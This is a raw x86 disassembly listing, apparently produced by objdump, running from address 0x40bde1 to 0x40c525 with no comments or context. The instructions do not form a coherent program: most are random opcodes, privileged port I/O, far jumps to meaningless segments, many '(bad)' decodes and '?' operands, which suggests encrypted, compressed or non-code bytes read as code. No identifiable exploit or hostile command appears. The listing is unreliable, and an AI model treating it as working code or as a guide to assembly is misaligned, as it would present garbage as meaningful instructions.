  40bde1:	adc    eax,0x51833a4d
  40bde6:	lea    edx,[eax+0x29]
  40bde9:	xlat   BYTE PTR ds:[ebx]
  40bdea:	jno    0x40bdf6
  40bdec:	adc    al,0x20
  40bdee:	xor    edi,ecx
  40bdf0:	dec    ecx
  40bdf1:	mov    cs,WORD PTR ds:0xe1f093dc
  40bdf7:	lahf   
  40bdf8:	pop    es
  40bdf9:	pop    ebx
  40bdfa:	cmp    eax,0xfb91b83b
  40bdff:	fisttp QWORD PTR [edx]
  40be01:	(bad)  
  40be02:	xchg   esp,eax
  40be03:	mov    edx,0x5756ece
  40be08:	adc    eax,0x560a6852
  40be0d:	out    dx,al
  40be0e:	xchg   esi,eax
  40be0f:	jns    0x40be0d
  40be11:	mov    ds,WORD PTR [ecx]
  40be13:	pop    edx
  40be14:	call   0x8f31:0xee6600b8
  40be1b:	push   ss
  40be1c:	xor    cl,BYTE PTR [edi]
  40be1e:	fnstenv [edx]
  40be20:	pop    edi
  40be21:	push   ss
  40be22:	(bad)  
  40be23:	aas    
  40be24:	push   eax
  40be25:	jl     0x40bdcf
  40be27:	mov    cl,0xf8
  40be29:	loop   0x40bdee
  40be2b:	xor    DWORD PTR [edx+0x56dc4108],0xffffff90
  40be32:	pop    edx
  40be33:	pop    ds
  40be34:	mov    bl,BYTE PTR [esi+ebx*4+0x37]
  40be38:	int3   
  40be39:	pop    eax
  40be3a:	cmp    al,0x9a
  40be3c:	mov    ds:0xe42046bd,eax
  40be41:	dec    ebp
  40be42:	pop    esi
  40be43:	push   0xffffffe6
  40be45:	repnz pop ecx
  40be47:	xor    al,dl
  40be49:	jae    0x40be45
  40be4b:	jl     0x40bdda
  40be4d:	mov    dh,0x89
  40be4f:	ins    DWORD PTR es:[edi],dx
  40be50:	outs   dx,DWORD PTR ds:[esi]
  40be51:	icebp  
  40be52:	cmp    DWORD PTR [ecx],edi
  40be54:	pop    esp
  40be56:	jo     0x40be00
  40be58:	ins    DWORD PTR es:[edi],dx
  40be59:	outs   dx,DWORD PTR ds:[esi]
  40be5a:	retf   
  40be5b:	inc    esp
  40be5c:	or     ebp,eax
  40be5e:	hlt    
  40be5f:	aad    0xc8
  40be61:	pop    ecx
  40be62:	ins    BYTE PTR es:[edi],dx
  40be63:	mov    ebx,0xf21b6e75
  40be68:	or     eax,0xdd0f7efa
  40be6d:	adc    edi,esp
  40be6f:	mov    edx,0x8723fa24
  40be74:	inc    ebx
  40be75:	sub    bh,BYTE PTR [edi+0x566d72e6]
  40be7b:	(bad)  
  40be7c:	fadd   DWORD PTR ds:0x588e0356
  40be82:	mov    dh,0x3a
  40be84:	sub    dh,0x6f
  40be87:	cmp    al,0x23
  40be89:	push   eax
  40be8a:	xchg   ecx,eax
  40be8b:	adc    DWORD PTR [ebx-0x53],eax
  40be8e:	xchg   ecx,eax
  40be8f:	and    al,0x12
  40be91:	call   0x7be9:0x91f540ad
  40be98:	pop    ecx
  40be99:	stc    
  40be9a:	or     al,0x7
  40be9c:	sbb    al,0xd8
  40be9e:	mov    dh,0xe4
  40bea0:	mov    bl,0xa3
  40bea2:	imul   eax,ebp,0xffffff9d
  40bea5:	out    0x76,eax
  40bea7:	inc    edi
  40bea8:	loop   0x40be31
  40beaa:	enter  0x7a12,0xd9
  40beae:	xor    al,BYTE PTR [ebx+eax*1]
  40beb1:	or     esi,DWORD PTR [edx+0x2f]
  40beb4:	and    al,0x34
  40beb6:	jno    0x40beb6
  40beb8:	inc    eax
  40beb9:	into   
  40beba:	mov    al,ds:0xe3aec56c
  40bebf:	xchg   DWORD PTR [ebp+0x5449e9e7],edi
  40bec5:	enter  0x969d,0xf8
  40bec9:	cmp    DWORD PTR [edx+eiz*8+0x64],edi
  40becd:	and    DWORD PTR [eax+0x3a0b9e20],ebp
  40bed3:	lods   eax,DWORD PTR ds:[esi]
  40bed4:	jae    0x40be58
  40bed6:	mov    dh,BYTE PTR [ecx]
  40bed8:	test   al,0x57
  40beda:	pop    es
  40bedb:	stos   BYTE PTR es:[edi],al
  40bedc:	bound  esp,QWORD PTR [ebx+0x3b]
  40bedf:	sti    
  40bee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bee1:	sub    eax,0xe69beefd
  40bee6:	bound  eax,QWORD PTR [ebx-0x474e4be]
  40beec:	mov    ss,WORD PTR [ebx+0x0]
  40beef:	add    eax,0xa71968e7
  40bef4:	fstp   DWORD PTR fs:[esi+esi*2-0x52bdc1b7]
  40befc:	clc    
  40befd:	jl     0x40bf66
  40beff:	icebp  
  40bf00:	pop    edx
  40bf01:	pop    edx
  40bf02:	addr16 cdq 
  40bf04:	(bad)  
  40bf05:	std    
  40bf06:	lods   eax,DWORD PTR ds:[esi]
  40bf07:	stc    
  40bf08:	aaa    
  40bf09:	fcmovnu st,st(5)
  40bf0b:	outs   dx,BYTE PTR ds:[esi]
  40bf0c:	test   BYTE PTR [edi-0x5e],al
  40bf0f:	out    dx,al
  40bf10:	mov    ds:0xee5207e4,eax
  40bf15:	ins    BYTE PTR es:[edi],dx
  40bf16:	inc    esi
  40bf17:	and    al,0xd3
  40bf19:	and    BYTE PTR [ebp-0x2],al
  40bf1c:	xor    eax,0x573ee4bc
  40bf21:	xchg   esi,eax
  40bf22:	ds jmp 0xc07b:0x510eb7a4
  40bf2a:	push   ecx
  40bf2b:	add    al,0x25
  40bf2d:	cwde   
  40bf2e:	sti    
  40bf2f:	pop    eax
  40bf30:	lea    edx,[ebp-0x7a]
  40bf33:	call   0xda09:0x9d20142a
  40bf3a:	enter  0x4c5f,0xd1
  40bf3e:	xor    edx,DWORD PTR [edi]
  40bf40:	inc    ecx
  40bf41:	jecxz  0x40bfb9
  40bf43:	popf   
  40bf44:	(bad)  
  40bf46:	psrlq  mm1,QWORD PTR [ebp-0x77fe7223]
  40bf4d:	ret    
  40bf4e:	pop    edx
  40bf4f:	dec    esp
  40bf50:	sub    bl,BYTE PTR [ecx]
  40bf52:	mov    ebp,?
  40bf54:	sar    DWORD PTR [edi-0x6129f187],1
  40bf5a:	fcom   QWORD PTR [edi-0x47]
  40bf5d:	pop    esi
  40bf5e:	adc    BYTE PTR [ebp-0x2edd97a4],0x7
  40bf65:	or     dh,BYTE PTR [eax-0x2432621b]
  40bf6b:	ror    DWORD PTR [ebx-0x45d1097a],cl
  40bf71:	(bad)  
  40bf72:	push   ebx
  40bf73:	aaa    
  40bf74:	aas    
  40bf75:	adc    eax,0x94b99715
  40bf7a:	fndisi(8087 only) 
  40bf7c:	sahf   
  40bf7d:	loope  0x40bf31
  40bf7f:	imul   esp,esp,0x6c
  40bf82:	lods   eax,DWORD PTR ds:[esi]
  40bf83:	pop    DWORD PTR [eax-0x80]
  40bf86:	call   0x84889d95
  40bf8b:	cmp    BYTE PTR ds:0x9ad06b33,0xb0
  40bf92:	jmp    0x40bfd0
  40bf94:	xor    BYTE PTR [esi-0x32],dh
  40bf97:	fst    QWORD PTR [ecx+0x26]
  40bf9a:	adc    al,0x20
  40bf9c:	add    eax,0x3e62dee0
  40bfa1:	xor    ebx,DWORD PTR [ecx]
  40bfa3:	out    dx,al
  40bfa4:	xchg   edx,eax
  40bfa5:	mov    dh,0xc
  40bfa7:	mov    edx,0x69cb5e67
  40bfac:	inc    esi
  40bfad:	(bad)  
  40bfae:	retf   
  40bfaf:	push   es
  40bfb0:	loope  0x40c031
  40bfb2:	ret    0x361
  40bfb5:	pop    edx
  40bfb6:	adc    al,BYTE PTR [edx]
  40bfb8:	xchg   edi,eax
  40bfb9:	cmc    
  40bfba:	pop    es
  40bfbb:	loop   0x40c023
  40bfbd:	popf   
  40bfbe:	inc    esi
  40bfbf:	shr    ecx,cl
  40bfc1:	in     eax,0xf
  40bfc3:	jmp    0xc8c1:0x4a8daa8f
  40bfca:	daa    
  40bfcb:	loope  0x40c014
  40bfcd:	ins    BYTE PTR es:[edi],dx
  40bfce:	push   cs
  40bfcf:	mov    ebx,0xf4a9f64c
  40bfd4:	jbe    0x40bfcd
  40bfd6:	push   ecx
  40bfd7:	pop    ebp
  40bfd8:	inc    ecx
  40bfd9:	and    al,0xc7
  40bfdb:	jg     0x40bfb4
  40bfdd:	std    
  40bfde:	test   ch,0x5a
  40bfe1:	dec    ebp
  40bfe2:	xchg   ebp,eax
  40bfe3:	inc    edx
  40bfe4:	out    0x6b,al
  40bfe6:	xchg   edi,eax
  40bfe7:	mov    dh,BYTE PTR [ebx+0x4e]
  40bfea:	cld    
  40bfeb:	jb     0x40c025
  40bfed:	push   ebx
  40bfee:	jb     0x40bfd0
  40bff0:	jmp    0xcf1e:0xe9367ba5
  40bff7:	mov    cl,0x2d
  40bff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bffa:	inc    eax
  40bffb:	ja     0x40bfc2
  40bffd:	rcl    DWORD PTR [edx-0x3e],1
  40c000:	hlt    
  40c001:	adc    DWORD PTR [esi-0x46],ebx
  40c004:	adc    cl,BYTE PTR [edx+0x2c]
  40c007:	push   es
  40c008:	loope  0x40bfac
  40c00a:	dec    esi
  40c00b:	xchg   DWORD PTR [eax+0x2d792efa],edx
  40c011:	je     0x40c03c
  40c013:	dec    esp
  40c014:	pop    edx
  40c015:	jae    0x40c072
  40c017:	hlt    
  40c018:	mov    dl,0x93
  40c01a:	or     al,0xe0
  40c01c:	push   0x2d
  40c01e:	mov    ebp,DWORD PTR [ebp-0x46]
  40c021:	mov    ebp,0xf1589903
  40c026:	ins    DWORD PTR es:[edi],dx
  40c027:	test   BYTE PTR [ebp+0x7dd772b],al
  40c02d:	enter  0x74f1,0xda
  40c031:	push   ds
  40c032:	ins    DWORD PTR es:[edi],dx
  40c033:	inc    ebp
  40c034:	ss call 0xa925e159
  40c03a:	jo     0x40c018
  40c03c:	dec    BYTE PTR [edi+0xf]
  40c03f:	dec    edx
  40c040:	jne    0x40c01e
  40c042:	lock rcl BYTE PTR [ebx+0x7f],cl
  40c046:	sub    DWORD PTR [ecx],ebp
  40c048:	mov    al,ds:0x2038cba
  40c04d:	js     0x40bfd5
  40c04f:	cmc    
  40c050:	call   0xd599:0xcff5f7a7
  40c057:	pop    ebx
  40c058:	mov    ah,0x7
  40c05a:	aaa    
  40c05b:	rcl    BYTE PTR ds:0x80d0db75,1
  40c061:	rol    DWORD PTR [edi-0x4376403f],0x2d
  40c068:	leave  
  40c069:	retf   0x21f4
  40c06c:	push   ss
  40c06d:	sub    BYTE PTR [ebp-0x4ab80723],bl
  40c073:	(bad)  
  40c074:	mov    al,0xcf
  40c076:	jmp    0xf59c4adf
  40c07b:	mov    edi,0xf1bf633d
  40c080:	std    
  40c081:	test   DWORD PTR [esp+eax*1],eax
  40c084:	xchg   esp,eax
  40c085:	js     0x40c047
  40c087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c088:	cmc    
  40c089:	mov    DWORD PTR [esi-0x268e3b2a],eax
  40c08f:	hlt    
  40c090:	cmovb  esp,DWORD PTR [esi]
  40c093:	add    DWORD PTR [edi+0x1a],esi
  40c096:	in     al,0xae
  40c098:	repnz clc 
  40c09a:	xchg   ebx,eax
  40c09b:	add    al,0x2
  40c09d:	nop
  40c09e:	int3   
  40c09f:	xchg   edi,eax
  40c0a0:	nop
  40c0a1:	in     al,dx
  40c0a2:	fbstp  TBYTE PTR [ecx]
  40c0a4:	js     0x40c040
  40c0a6:	mov    esp,0x70d06f3e
  40c0ab:	xchg   esp,eax
  40c0ac:	imul   ecx,DWORD PTR [eax],0x1
  40c0af:	mov    cl,0xf1
  40c0b1:	or     DWORD PTR [edx-0x4ac65dda],0x31
  40c0b8:	sbb    al,0xb0
  40c0ba:	stos   DWORD PTR es:[edi],eax
  40c0bb:	xor    BYTE PTR [edx-0x55],0xcc
  40c0bf:	test   DWORD PTR [ebx],ebp
  40c0c1:	cmp    al,0xeb
  40c0c3:	add    BYTE PTR [edi-0x70],ch
  40c0c6:	mov    edx,0xd6671ddc
  40c0cb:	jae    0x40c071
  40c0cd:	xor    eax,eax
  40c0cf:	lods   eax,DWORD PTR ds:[esi]
  40c0d0:	int    0x99
  40c0d2:	popa   
  40c0d3:	inc    ebx
  40c0d4:	add    edx,0x12
  40c0d7:	lea    edx,[ebx]
  40c0d9:	mov    edx,0x1e5a9b19
  40c0de:	mov    ebp,0xfc3482a3
  40c0e3:	xlat   BYTE PTR ds:[ebx]
  40c0e4:	mov    cl,0x26
  40c0e6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40c0e8:	popa   
  40c0e9:	and    al,0xd4
  40c0eb:	inc    edx
  40c0ec:	daa    
  40c0ed:	pop    ebx
  40c0ee:	icebp  
  40c0ef:	fmul   DWORD PTR [ebx-0x590bfe3d]
  40c0f5:	or     al,ah
  40c0f7:	adc    eax,0x41b3e6d2
  40c0fc:	pushf  
  40c0fd:	xchg   edx,eax
  40c0fe:	pop    ecx
  40c0ff:	sbb    eax,0xa71faf3e
  40c104:	ror    BYTE PTR [eax+0x34],1
  40c107:	or     DWORD PTR [esi-0x49],esi
  40c10a:	pop    ebx
  40c10b:	jmp    0x40c0ca
  40c10d:	(bad)  
  40c10e:	out    0x2c,eax
  40c110:	mov    edx,0xd8a5b20e
  40c115:	xor    BYTE PTR ds:0x8a787a22,ch
  40c11b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c11c:	sbb    edx,DWORD PTR [ecx]
  40c11e:	or     al,dl
  40c120:	mov    ah,0x4
  40c122:	mov    edi,0x26fd0fbc
  40c127:	fild   WORD PTR [edx+0x70]
  40c12a:	and    esi,DWORD PTR [eax-0x2ffd98e7]
  40c130:	out    dx,eax
  40c131:	das    
  40c132:	fwait
  40c133:	aas    
  40c134:	adc    BYTE PTR [edi+0x71dc901e],bh
  40c13a:	mov    ds:0xb0c4db4d,al
  40c13f:	aas    
  40c140:	dec    edi
  40c141:	ins    BYTE PTR es:[edi],dx
  40c142:	jno    0x40c1c2
  40c144:	inc    eax
  40c145:	stos   BYTE PTR es:[edi],al
  40c146:	pop    ds
  40c147:	pop    ds
  40c148:	iret   
  40c149:	icebp  
  40c14a:	aad    0x34
  40c14c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c14d:	add    al,0xa1
  40c14f:	cmp    BYTE PTR [edi-0x13c10ee7],bh
  40c155:	mov    ebx,0xbd26908f
  40c15a:	cdq    
  40c15b:	sti    
  40c15c:	and    ebx,DWORD PTR [edx-0x2491924e]
  40c162:	addr16 je 0x40c1c7
  40c165:	cwde   
  40c166:	mov    ds:0x6c6e25f3,eax
  40c16b:	out    dx,eax
  40c16c:	xchg   esi,eax
  40c16d:	les    esp,FWORD PTR [edi+0x1c0f4d6]
  40c173:	xchg   ebp,eax
  40c174:	jmp    0xe50b8200
  40c179:	and    DWORD PTR [ecx-0x35ba5fbc],ebx
  40c17f:	dec    ebx
  40c180:	sahf   
  40c181:	push   esp
  40c182:	or     eax,0x62a6390f
  40c187:	lahf   
  40c188:	mov    edx,esp
  40c18a:	inc    edi
  40c18b:	mov    al,0x32
  40c18d:	xchg   BYTE PTR ds:0x8696de9c,al
  40c193:	in     eax,0xb3
  40c195:	mov    bh,0x65
  40c197:	xchg   edi,eax
  40c198:	in     eax,0x8c
  40c19a:	jno    0x40c146
  40c19c:	(bad)  
  40c19d:	(bad)  
  40c19e:	and    eax,0x39ba433d
  40c1a3:	add    esi,ecx
  40c1a5:	mov    eax,ds:0xd862ba28
  40c1aa:	mov    ecx,0x9cf5599a
  40c1af:	adc    eax,0x6bd3ccf3
  40c1b4:	and    BYTE PTR [esi+0xb],al
  40c1b7:	hlt    
  40c1b8:	test   BYTE PTR [edi-0x188ef95c],ch
  40c1be:	call   0xc6ad:0xd417e50f
  40c1c5:	and    eax,0xb3abe1c3
  40c1ca:	jae    0x40c1f0
  40c1cc:	jo     0x40c1bd
  40c1ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1cf:	push   edx
  40c1d0:	sar    BYTE PTR [edx],cl
  40c1d2:	iret   
  40c1d3:	lods   al,BYTE PTR ds:[esi]
  40c1d4:	outs   dx,DWORD PTR ds:[esi]
  40c1d5:	mov    dh,0xc5
  40c1d7:	ins    BYTE PTR es:[edi],dx
  40c1d8:	xor    BYTE PTR [eax-0x277f31dc],bl
  40c1de:	mov    al,0x25
  40c1e0:	pop    edx
  40c1e1:	pop    edi
  40c1e2:	(bad)  
  40c1e4:	call   0x39f3c855
  40c1e9:	xchg   ebx,eax
  40c1ea:	ss repz pushf 
  40c1ed:	out    0xa5,al
  40c1ef:	or     ch,BYTE PTR [ebx-0x6a]
  40c1f2:	out    dx,al
  40c1f3:	rcl    DWORD PTR [esi-0x35],cl
  40c1f6:	stos   DWORD PTR es:[edi],eax
  40c1f7:	jae    0x40c1d6
  40c1f9:	jecxz  0x40c207
  40c1fb:	fcmovbe st,st(2)
  40c1fd:	add    dl,BYTE PTR [ebp+edi*4+0x6a]
  40c201:	inc    esi
  40c202:	fs sti 
  40c204:	mov    ecx,DWORD PTR [edi+0x23]
  40c207:	shl    BYTE PTR [edx+edx*2-0x2030649f],cl
  40c20e:	xor    ch,ch
  40c210:	mov    ecx,ds
  40c212:	sbb    edx,DWORD PTR [esi+0x2]
  40c215:	(bad)  [edx]
  40c217:	daa    
  40c218:	outs   dx,BYTE PTR ds:[esi]
  40c219:	inc    eax
  40c21a:	mov    esp,0xabf36d2d
  40c21f:	pop    esi
  40c220:	mov    cl,0x50
  40c222:	sbb    edx,DWORD PTR [esi+esi*4+0xb85178f]
  40c229:	popa   
  40c22a:	xlat   BYTE PTR ds:[ebx]
  40c22b:	or     BYTE PTR [edx+0x63],dh
  40c22e:	dec    ebx
  40c22f:	out    0x1d,eax
  40c231:	nop
  40c232:	cmc    
  40c233:	data16 jl 0x40c2a8
  40c236:	add    eax,0x94bbaba2
  40c23b:	pinsrw mm7,WORD PTR [ebp+0x3863bf8d],0x4
  40c243:	inc    esi
  40c244:	in     eax,dx
  40c245:	push   es
  40c246:	in     eax,0x66
  40c248:	pop    es
  40c249:	lods   al,BYTE PTR ds:[esi]
  40c24a:	imul   DWORD PTR [ebx+0x5bc81684]
  40c250:	je     0x40c283
  40c252:	sti    
  40c253:	outs   dx,BYTE PTR ds:[esi]
  40c254:	mov    bh,ch
  40c256:	fs push esp
  40c258:	lods   al,BYTE PTR ds:[esi]
  40c259:	loop   0x40c23b
  40c25b:	adc    DWORD PTR [edi],esi
  40c25d:	pop    ebx
  40c25e:	inc    eax
  40c25f:	ficom  DWORD PTR [ecx]
  40c261:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c262:	sbb    al,0xcb
  40c264:	or     dl,BYTE PTR [edx+0x334aee56]
  40c26a:	jo     0x40c21b
  40c26c:	mov    esp,0x8324d062
  40c271:	or     DWORD PTR [edi],esp
  40c273:	mov    dh,0xe8
  40c275:	xchg   cl,dl
  40c277:	jp     0x40c21b
  40c279:	psllq  mm1,mm6
  40c27c:	fwait
  40c27d:	or     ebx,edx
  40c27f:	repz aaa 
  40c281:	daa    
  40c282:	fdivr  st,st(5)
  40c284:	sbb    dh,al
  40c286:	adc    al,0x2f
  40c288:	cld    
  40c289:	iret   
  40c28a:	fyl2xp1 
  40c28c:	xchg   ebp,eax
  40c28d:	(bad)  
  40c28e:	cmp    bh,dh
  40c290:	jns    0x40c2b3
  40c292:	mov    al,0xed
  40c294:	test   BYTE PTR [ecx+0x14fc375f],al
  40c29a:	pop    ds
  40c29b:	or     al,0x29
  40c29d:	cmp    BYTE PTR [eax],ah
  40c29f:	mov    al,0x21
  40c2a1:	lock aam 0xca
  40c2a4:	push   ss
  40c2a5:	(bad)  
  40c2a6:	and    al,0x73
  40c2a8:	jno    0x40c28b
  40c2aa:	xor    al,0x9e
  40c2ac:	sbb    DWORD PTR [esi],0xfedbeafc
  40c2b2:	and    al,0xcd
  40c2b4:	push   edi
  40c2b5:	(bad)  
  40c2b6:	in     al,dx
  40c2b7:	mov    esp,0x6110bd69
  40c2bc:	add    DWORD PTR [ebx-0x50],eax
  40c2bf:	mov    ebx,0x2411f657
  40c2c4:	movq   QWORD PTR [edx],mm7
  40c2c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2c9:	inc    esi
  40c2ca:	and    eax,0x44f21896
  40c2cf:	inc    edi
  40c2d0:	leave  
  40c2d1:	ror    edi,0x4e
  40c2d4:	outs   dx,DWORD PTR gs:[esi]
  40c2d6:	push   ds
  40c2d7:	lods   al,BYTE PTR ds:[esi]
  40c2d8:	mov    ?,WORD PTR [edi+edx*1+0x48ad9719]
  40c2df:	arpl   WORD PTR gs:[eax],bp
  40c2e2:	xchg   BYTE PTR [esi-0x3c32821f],dh
  40c2e8:	jge    0x40c290
  40c2ea:	in     al,0x53
  40c2ec:	and    DWORD PTR [ebx-0x3b],0x4d
  40c2f0:	retf   0xbda6
  40c2f3:	cdq    
  40c2f4:	fsub   QWORD PTR [edi]
  40c2f6:	add    ch,BYTE PTR [ebp-0x37]
  40c2f9:	bound  edi,QWORD PTR [ecx]
  40c2fb:	fcom   QWORD PTR [edx+0x61180fac]
  40c301:	pop    ebp
  40c302:	or     DWORD PTR [esi+eax*2-0x4d],edx
  40c306:	dec    ebp
  40c307:	mov    WORD PTR [esi-0x2d],?
  40c30a:	repnz aas 
  40c30c:	xlat   BYTE PTR ds:[ebx]
  40c30d:	fldcw  WORD PTR [ebx+eiz*2+0x20]
  40c311:	adc    bl,0x89
  40c314:	stos   BYTE PTR es:[edi],al
  40c315:	mov    bl,0xde
  40c317:	loop   0x40c35a
  40c319:	mov    ds:0x1aa9ab89,eax
  40c31e:	push   edi
  40c31f:	ret    
  40c320:	inc    ebp
  40c321:	jp     0x40c34d
  40c323:	cs retw 0xcbeb
  40c328:	(bad)  
  40c329:	daa    
  40c32a:	inc    esi
  40c32b:	test   eax,0xc5985d23
  40c330:	push   edx
  40c331:	sbb    BYTE PTR [eax+0x7e22d4bf],dl
  40c337:	dec    edx
  40c338:	cmp    BYTE PTR [eax],ch
  40c33a:	cdq    
  40c33b:	mov    ebp,0xe79af7b9
  40c340:	fst    DWORD PTR [ebx+0x7e8b327f]
  40c346:	arpl   WORD PTR [eax-0x3a],sp
  40c349:	jns    0x40c2ee
  40c34b:	rcl    ebp,0x80
  40c34e:	in     eax,0x46
  40c350:	push   es
  40c351:	je     0x5fad005f
  40c357:	mov    DWORD PTR [ebp+0x39fd0e7d],0x23b0c6a9
  40c361:	xor    al,0x68
  40c363:	sub    BYTE PTR [edx-0x9],ah
  40c366:	push   ebx
  40c367:	adc    eax,0x81990cf9
  40c36c:	dec    BYTE PTR [eax+eiz*8+0x77]
  40c370:	stos   BYTE PTR es:[edi],al
  40c371:	pop    ebp
  40c372:	out    dx,eax
  40c373:	adc    al,0x36
  40c375:	repz jbe 0x40c303
  40c378:	add    esi,DWORD PTR [esi-0x480700a6]
  40c37e:	jmp    0x649c:0xbb0822cb
  40c385:	and    dh,al
  40c387:	aas    
  40c388:	add    al,0xce
  40c38a:	mov    edi,0xbf34aa43
  40c38f:	gs pop ds
  40c391:	into   
  40c392:	scas   al,BYTE PTR es:[edi]
  40c393:	add    bh,BYTE PTR [edi-0x70250a7c]
  40c399:	clc    
  40c39a:	outs   dx,DWORD PTR ds:[esi]
  40c39b:	stos   DWORD PTR es:[edi],eax
  40c39c:	cmp    BYTE PTR [eax],dl
  40c39e:	mov    edx,DWORD PTR [ebx-0x594b38e]
  40c3a4:	sbb    DWORD PTR [eax],esi
  40c3a6:	jp     0x40c3c1
  40c3a8:	sub    ebx,DWORD PTR [eax+0x1aa974fd]
  40c3ae:	push   eax
  40c3af:	scas   eax,DWORD PTR es:[edi]
  40c3b0:	xchg   ecx,eax
  40c3b1:	sub    eax,0x43dd863e
  40c3b6:	not    DWORD PTR [eax-0xe]
  40c3b9:	push   ss
  40c3ba:	inc    ebx
  40c3bb:	adc    al,0xaa
  40c3bd:	add    al,0x74
  40c3bf:	lods   al,BYTE PTR ds:[esi]
  40c3c0:	mov    al,ds:0x3efe338d
  40c3c5:	arpl   WORD PTR [ecx],bp
  40c3c7:	stos   BYTE PTR es:[edi],al
  40c3c8:	stos   DWORD PTR es:[edi],eax
  40c3c9:	scas   al,BYTE PTR es:[edi]
  40c3ca:	retf   
  40c3cb:	add    BYTE PTR [edx+ebp*8+0x2f724f60],bl
  40c3d2:	repnz mov ds:0x61cf0645,al
  40c3d8:	lods   al,BYTE PTR ds:[esi]
  40c3d9:	iret   
  40c3da:	ins    DWORD PTR es:[edi],dx
  40c3db:	inc    edi
  40c3dc:	xor    DWORD PTR [edi],ecx
  40c3de:	mov    edx,0x75783de3
  40c3e3:	mov    esi,0x36e5ec59
  40c3e8:	(bad)  
  40c3ea:	jno    0x40c377
  40c3ec:	jecxz  0x40c406
  40c3ee:	std    
  40c3ef:	repnz pop ebx
  40c3f1:	dec    esp
  40c3f2:	mov    ds:0x530d6ee5,al
  40c3f7:	fistp  QWORD PTR ds:0x8119cc53
  40c3fd:	out    dx,eax
  40c3fe:	xlat   BYTE PTR ds:[ebx]
  40c3ff:	(bad)  
  40c400:	popa   
  40c401:	sar    cl,0x7c
  40c404:	mov    cl,0x71
  40c406:	out    dx,al
  40c407:	cdq    
  40c408:	in     eax,dx
  40c409:	lahf   
  40c40a:	dec    edx
  40c40b:	mov    ch,0x98
  40c40d:	outs   dx,DWORD PTR ds:[esi]
  40c40e:	out    dx,al
  40c40f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c410:	fcom   QWORD PTR [edx]
  40c412:	int    0x79
  40c414:	icebp  
  40c415:	adc    DWORD PTR [ebp-0x5cdf85dc],ebx
  40c41b:	sar    BYTE PTR [esi-0x5a],0x97
  40c41f:	sbb    esi,DWORD PTR ds:0x3cdb9780
  40c425:	sub    dl,BYTE PTR [esi+0x22488fe1]
  40c42b:	jbe    0x40c471
  40c42d:	xchg   ebp,eax
  40c42e:	push   esi
  40c42f:	ret    
  40c430:	(bad)  
  40c431:	cmp    BYTE PTR [edx-0x20402b2e],ch
  40c437:	mov    ebx,edi
  40c439:	imul   eax,DWORD PTR [eax-0x12f8c991],0xf0da6538
  40c443:	xchg   esi,eax
  40c444:	mov    dh,0x3e
  40c446:	inc    edi
  40c447:	pop    eax
  40c448:	inc    ebp
  40c449:	std    
  40c44a:	mov    WORD PTR [edi-0x7952e61f],gs
  40c450:	dec    esi
  40c451:	mov    bh,0x11
  40c453:	ja     0x40c43b
  40c455:	pop    esi
  40c456:	stos   DWORD PTR es:[edi],eax
  40c457:	les    edx,FWORD PTR [ebx+0x73f3bead]
  40c45d:	sub    al,0x6e
  40c45f:	loope  0x40c4b5
  40c461:	pop    es
  40c462:	push   esi
  40c463:	loopne 0x40c489
  40c465:	les    ebx,FWORD PTR [ecx+0x5]
  40c468:	mov    esp,0x559ebcb8
  40c46d:	lock adc ch,BYTE PTR [esi]
  40c470:	test   eax,0xebf3c998
  40c475:	or     DWORD PTR [esi-0x5c],0x4d
  40c479:	xchg   ebp,eax
  40c47a:	and    al,bl
  40c47c:	ins    BYTE PTR es:[edi],dx
  40c47d:	popf   
  40c47e:	mov    dl,0xf4
  40c480:	(bad)  
  40c482:	sbb    DWORD PTR [ebx+0x3365a2f3],ebp
  40c488:	push   cs
  40c489:	or     DWORD PTR [edi],edx
  40c48b:	or     ecx,DWORD PTR [edx]
  40c48d:	jnp    0x40c46d
  40c48f:	arpl   WORD PTR [ebx+0x682b9d48],di
  40c495:	aam    0xbe
  40c497:	push   cs
  40c498:	cld    
  40c499:	cmc    
  40c49a:	div    al
  40c49c:	and    eax,0x67325f1e
  40c4a1:	enter  0x3744,0x62
  40c4a5:	iret   
  40c4a6:	sub    eax,0xe6770722
  40c4ab:	aad    0xa2
  40c4ad:	inc    ecx
  40c4ae:	fild   QWORD PTR [ebx+ecx*8-0xf]
  40c4b2:	xchg   ebp,eax
  40c4b3:	and    al,0x51
  40c4b5:	xor    al,0x46
  40c4b7:	outs   dx,DWORD PTR ds:[esi]
  40c4b8:	push   ebx
  40c4b9:	imul   DWORD PTR [edi+0x41]
  40c4bc:	es jg  0x40c4d0
  40c4bf:	mov    eax,ds:0xf020cef4
  40c4c4:	idiv   BYTE PTR [edx+ecx*2]
  40c4c7:	add    dl,cl
  40c4c9:	hlt    
  40c4ca:	inc    eax
  40c4cb:	sbb    ebp,DWORD PTR ds:[ebp+edi*8-0x235fd119]
  40c4d3:	jp     0x40c4dc
  40c4d5:	loop   0x40c4ed
  40c4d7:	sbb    BYTE PTR [eax],0x64
  40c4da:	pop    ebp
  40c4db:	jmp    0x40c46a
  40c4dd:	inc    ecx
  40c4df:	pop    es
  40c4e0:	xor    bl,BYTE PTR [edx]
  40c4e2:	in     al,dx
  40c4e3:	mov    eax,ds:0xa4d9e1bf
  40c4e8:	or     bh,bh
  40c4ea:	push   esp
  40c4eb:	jmp    0x33b0:0x344dbaa7
  40c4f2:	sub    dl,ch
  40c4f4:	cld    
  40c4f5:	aam    0x63
  40c4f7:	mov    ecx,0xf4a7ed95
  40c4fc:	pop    esp
  40c4fd:	icebp  
  40c4fe:	xchg   ebx,eax
  40c4ff:	ds je  0x40c4e6
  40c502:	dec    ebp
  40c503:	mov    ebx,0x14703ac8
  40c508:	mov    edx,0xbe53dfb9
  40c50d:	dec    ebp
  40c50e:	adc    BYTE PTR [ebp+0x7a719288],0xb9
  40c515:	inc    ecx
  40c516:	push   esi
  40c517:	fnstenv [eax-0x5b]
  40c51a:	and    esi,0x4587d37e
  40c520:	iret   
  40c521:	in     eax,0x79
  40c523:	add    esi,ebp
  40c525:	jp     0x40c551
